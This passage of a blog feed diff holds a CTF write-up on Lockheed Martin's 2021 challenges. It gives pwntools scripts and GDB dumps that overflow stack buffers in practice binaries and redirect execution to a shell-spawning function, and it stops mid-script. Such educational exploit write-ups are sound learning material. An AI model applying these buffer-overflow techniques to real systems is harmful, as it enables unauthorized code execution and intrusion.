@@ -1,4 +1,566 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-01-08T10:15:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Hooking Linux Function Calls Via LD_PRELOAD</title><link href="http://localhost:4000/2021/01/07/hooking-linux-function-calls-via-ld-preload.html" rel="alternate" type="text/html" title="Hooking Linux Function Calls Via LD_PRELOAD" /><published>2021-01-07T00:00:00-05:00</published><updated>2021-01-07T00:00:00-05:00</updated><id>http://localhost:4000/2021/01/07/hooking-linux-function-calls-via-ld-preload</id><content type="html" xml:base="http://localhost:4000/2021/01/07/hooking-linux-function-calls-via-ld-preload.html">&lt;p&gt;Hooking functions is the act of replacing a pointer to a function with a different pointer so that another function is called instead of the original function. For example, suppose there was a function &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; being called inside of a program. If an attacker has write permissions to the binary file, then the attacker can replace the code calling &lt;code class=&quot;highlighter-rouge&quot;&gt;x()&lt;/code&gt; with code that calls some malicious function &lt;code class=&quot;highlighter-rouge&quot;&gt;y()&lt;/code&gt; instead.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-01-10T20:04:49-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">LM Cyber CTF Writeups For PWN And Web Challenges</title><link href="http://localhost:4000/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html" rel="alternate" type="text/html" title="LM Cyber CTF Writeups For PWN And Web Challenges" /><published>2021-01-09T00:00:00-05:00</published><updated>2021-01-09T00:00:00-05:00</updated><id>http://localhost:4000/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges</id><content type="html" xml:base="http://localhost:4000/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html">&lt;p&gt;Recently, I played in Lockheed Martin’s 2021 CTF challenge, and my team, nullbytes, got first place. I mainly worked on the PWN and web exploitation challenges for my team, so here are my solutions for all the problems in those two categories.&lt;/p&gt;
+
+&lt;h3 id=&quot;cereal-creator&quot;&gt;Cereal Creator&lt;/h3&gt;
+
+&lt;p&gt;The first PWN challenge can be downloaded &lt;a href=&quot;../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn100&quot;&gt;here&lt;/a&gt;. This is a program that allows the user to “eat cereal.”&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pwn100
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Add Cereal flavor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Add milk
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] Eat
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;1
+What kind of cereal would you like to add to your bowl?
+AAAAAAAAAAAAAA
+adding cereal into your bowl
+added cereal to bowl
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Add Cereal flavor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Add milk
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] Eat
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;2
+pooring milk ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Add Cereal flavor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Add milk
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] Eat
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;3
+eating our bowl
+Bowl, AAAAAAAAAAAAAA with milk, was a great bowl of cereal
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The binary has NX enabled, meaning that we cannot inject shellcode into the stack and execute it.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  checksec
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] checksec &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/home/nihaal/Desktop/LMCTF/pwn100'&lt;/span&gt;
+Canary                        : No
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I played around with some of the input parameters, and I eventually found out that the program crashed if you eat something with a cereal flavor that has a long string. Using this crash, I created a Python script that overwrites &lt;code class=&quot;highlighter-rouge&quot;&gt;RIP&lt;/code&gt; with a bunch of Bs.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./pwn100&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;b *do_main+189&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;316&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Running this code would produce the following GDB prompt. As you can see, the saved &lt;code class=&quot;highlighter-rouge&quot;&gt;RIP&lt;/code&gt; value on the stack has been overwritten with a bunch of Bs. This means that we can jump to any function that we want.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0x00007ffcd7ad8cf0  →  0x0000000000000000
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x64
+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x00007ffcd7ad8d68  →  &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x3b3a393837363534 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;456789:;&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x00007ffcd7ad8cf0  →  0x0000000000000000
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x0000000000400a99  →  &amp;lt;do_main+189&amp;gt; ret
+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0xffffffff
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x9d
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0xfffffffffffff28e
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x00007f0b0190ee70  →  &amp;lt;__memset_avx2_unaligned+0&amp;gt; vmovd xmm0, esi
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x0000000000400710  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x0
+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ZERO carry PARITY adjust sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow resume virtualx86 identification]
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x0033 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x002b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcd7ad8d68│+0x0000: &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;   ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+0x00007ffcd7ad8d70│+0x0008: 0x00007ffcd7ad8e00  →  0x0000000000000000
+0x00007ffcd7ad8d78│+0x0010: 0x0000000100000000
+0x00007ffcd7ad8d80│+0x0018: 0x0000000000400ae0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+0x00007ffcd7ad8d88│+0x0020: 0x00007f0b017d2d0a  →  &amp;lt;__libc_start_main+234&amp;gt; mov edi, eax
+0x00007ffcd7ad8d90│+0x0028: 0x00007ffcd7ad8e78  →  0x00007ffcd7ada464  →  &lt;span class=&quot;s2&quot;&gt;&quot;./pwn100&quot;&lt;/span&gt;
+0x00007ffcd7ad8d98│+0x0030: 0x0000000100000000
+0x00007ffcd7ad8da0│+0x0038: 0x0000000000400a9a  →  &amp;lt;main+0&amp;gt; push rbp
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400a91 &amp;lt;do_main+181&amp;gt;    jne    0x400a02 &amp;lt;do_main+38&amp;gt;
+     0x400a97 &amp;lt;do_main+187&amp;gt;    nop
+     0x400a98 &amp;lt;do_main+188&amp;gt;    leave
+ →   0x400a99 &amp;lt;do_main+189&amp;gt;    ret
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Cannot disassemble from &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;pwn100&quot;, stopped, reason: BREAKPOINT&lt;/span&gt;
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x400a99 → do_main()&lt;/span&gt;
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7ffcd7ad8d68:
+ rip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x400a99 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;do_main&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; saved rip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x4242424242424242
+ called by frame at 0x7ffcd7ad8d78
+ Arglist at 0x3b3a393837363534, args:
+ Locals at 0x3b3a393837363534, Previous frame&lt;span class=&quot;s1&quot;&gt;'s sp is 0x7ffcd7ad8d70
+ Saved registers:
+  rip at 0x7ffcd7ad8d68
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Unfortunately, I did not have control over more than eight bytes on the stack. If I tried to use a ROP chain with more than one gadget, it would only execute the first gadget and ignore all the others. This meant that I had to find a single function that would produce a shell for me. I looked around at what functions were inside of the binary, and I saw a function named &lt;code class=&quot;highlighter-rouge&quot;&gt;custom_features&lt;/code&gt;. This function executes &lt;code class=&quot;highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;)&lt;/code&gt;, which is exactly what I needed.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  info functions custom_features
+All functions matching regular expression &lt;span class=&quot;s2&quot;&gt;&quot;custom_features&quot;&lt;/span&gt;:
+
+Non-debugging symbols:
+0x00000000004007f7  custom_features
+gef➤  disas custom_features
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;custom_features:
+   0x00000000004007f7 &amp;lt;+0&amp;gt;:     push   rbp
+   0x00000000004007f8 &amp;lt;+1&amp;gt;:     mov    rbp,rsp
+   0x00000000004007fb &amp;lt;+4&amp;gt;:     sub    rsp,0x10
+   0x00000000004007ff &amp;lt;+8&amp;gt;:     lea    rax,[rip+0x362]        &lt;span class=&quot;c&quot;&gt;# 0x400b68&lt;/span&gt;
+   0x0000000000400806 &amp;lt;+15&amp;gt;:    mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x10],rax
+   0x000000000040080a &amp;lt;+19&amp;gt;:    mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x0
+   0x0000000000400812 &amp;lt;+27&amp;gt;:    lea    rax,[rbp-0x10]
+   0x0000000000400816 &amp;lt;+31&amp;gt;:    mov    edx,0x0
+   0x000000000040081b &amp;lt;+36&amp;gt;:    mov    rsi,rax
+   0x000000000040081e &amp;lt;+39&amp;gt;:    lea    rdi,[rip+0x343]        &lt;span class=&quot;c&quot;&gt;# 0x400b68&lt;/span&gt;
+   0x0000000000400825 &amp;lt;+46&amp;gt;:    call   0x4006c0 &amp;lt;execve@plt&amp;gt;
+   0x000000000040082a &amp;lt;+51&amp;gt;:    nop
+   0x000000000040082b &amp;lt;+52&amp;gt;:    leave
+   0x000000000040082c &amp;lt;+53&amp;gt;:    ret
+End of assembler dump.
+gef➤  x/s 0x400b68
+0x400b68:       &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All I had to do now to get a shell was to replace the Bs in my script with the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x4007f7&lt;/code&gt;. Running this script would give me a shell.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./pwn100&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;b *do_main+189&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# p = remote(&quot;challenges.ctfd.io&quot;, 30429)
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;316&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4007f7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;cereal-creator-2&quot;&gt;Cereal Creator 2&lt;/h3&gt;
+&lt;p&gt;This binary, which you can download &lt;a href=&quot;../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn200&quot;&gt;here&lt;/a&gt;, was very similar to the last one, and it also had the NX bit enabled.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pwn200
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Add Cereal flavor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Add milk
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] Eat
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;1
+get ready to add some cereal!!
+
+current buf: BowlWhat kind of cereal would you like to add to your bowl?
+AAAAAAAAAAAAAAAAAAAAAAAAAA
+adding cereal into your bowl
+added cereal to bowl
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Add Cereal flavor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Add milk
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] Eat
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;2
+pooring milk ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] Add Cereal flavor
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2] Add milk
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3] Eat
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4] &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;3
+eating our bowl
+Bowl, AAAAAAAAAAAAAAAAAAAAAAAAAA with milk, was a great bowl of cereal
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once again, I found out that sending a long enough string to the cereal flavor input would cause the program to crash when you eat it. Although, this time the offset was slightly different.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./pwn200&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
